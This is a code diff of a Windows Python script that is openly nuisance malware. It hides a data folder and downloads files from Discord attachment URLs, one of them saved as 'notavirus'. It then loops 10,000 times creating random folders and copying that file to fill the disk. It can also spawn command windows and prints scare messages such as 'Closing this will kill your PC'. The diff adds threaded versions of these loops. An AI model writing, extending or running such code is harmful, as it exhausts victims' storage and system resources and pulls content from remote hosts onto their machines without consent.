@@ -17,11 +17,17 @@ from threading import Thread
 ############################################
 scaryspam = False
 spamcmd = False
-individualload = False
-showghostface = False
+individualload = True
+showghostface = True
+threadmode = False
 
 def install(package):
     os.system(f"{sys.executable} -m pip install {package}")
+
+try:
+    import shutil
+except ModuleNotFoundError:
+    install("shutil")
 
 try:
     import requests
@@ -127,26 +133,19 @@ def download_files():
     FILE_ATTRIBUTE_HIDDEN = 0x02
     ret = ctypes.windll.kernel32.SetFileAttributesW("./data/", FILE_ATTRIBUTE_HIDDEN)
     if not os.path.isfile(f'./data/popup.py'): open(f'./data/popup.py', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1068625802465386496/1089654576208154664/popup.py', allow_redirects=True).content)
-    if not os.path.isfile(f'./data/notavirus-{random.randint(1, 10000000)}'): open(f'./data/notavirus-{random.randint(1, 10000000)}', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1066222613812232233/1089270717847191552/1.txt', allow_redirects=True).content)
+    if not os.path.isfile(f'./data/notavirus'): open(f'./data/notavirus', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1066222613812232233/1089270717847191552/1.txt', allow_redirects=True).content)
     if not os.path.exists('./data/sounds'): os.makedirs('./data/sounds')
     time.sleep(1)
-
-    print("")
-    if individualload:
-        print(Colorate.Horizontal(Colors.green_to_white,f"Downloaded notavirus-{random.randint(1, 100000)} successfully!\n\n", 1))
-        print(Colorate.Horizontal(Colors.red_to_yellow,"- Note: Closing this will kill your PC...\n\n", 1))
-    else:
-        print(Colorate.Horizontal(Colors.green_to_white,f"Downloading Files...\n\n", 1))
 
 
 def ear_rape():
     playsound('./data/sounds/lol.mp3')
 
 def make_folders():
-    count = 0
-    while (count < 10000):
-        count = count + 1
-        if not os.path.exists(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}'): os.makedirs(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}')
+    if not os.path.exists(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}'): os.makedirs(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}')
+
+def spam_files():
+    shutil.copyfile(f'./data/notavirus', f'./data/notavirus-{random.randint(1, 10000000)}')
 
 def popup():
     ctypes.windll.user32.MessageBoxW(0, "That's an error", "Warning!", 16)
@@ -157,14 +156,38 @@ def open_cmd():
         count = count + 1
         os.system("start cmd")
 
-count = 0
-while (count < 10000):
-    count = count + 1
-    download_files()
-    make_folders()
-    if spamcmd:
-        open_cmd()
-    else:
-        pass
+def notif():
+        print("")
+        if individualload:
+            print(Colorate.Horizontal(Colors.green_to_white,f"Downloaded notavirus-{random.randint(1, 100000)} successfully!\n\n", 1))
+            print(Colorate.Horizontal(Colors.red_to_yellow,"- Note: Closing this will kill your PC...\n\n", 1))
+        else:
+            print(Colorate.Horizontal(Colors.green_to_white,f"Downloading Files...\n\n", 1))
+
+download_files()
+
+if threadmode:
+    count = 0
+    while (count < 10000):
+        count = count + 1
+        if __name__ == '__main__':
+            Thread(target = make_folders).start()
+            Thread(target = spam_files).start()
+            Thread(target = notif).start()
+        if spamcmd:
+            open_cmd()
+        else:
+            pass
+else:
+    count = 0
+    while (count < 10000):
+        count = count + 1
+        make_folders()
+        spam_files()
+        notif()
+        if spamcmd:
+            open_cmd()
+        else:
+            pass
 
 input(Colorate.Horizontal(Colors.red_to_yellow,"\nIf you made it here, you have a lot of storage... Press enter to close.", 1))
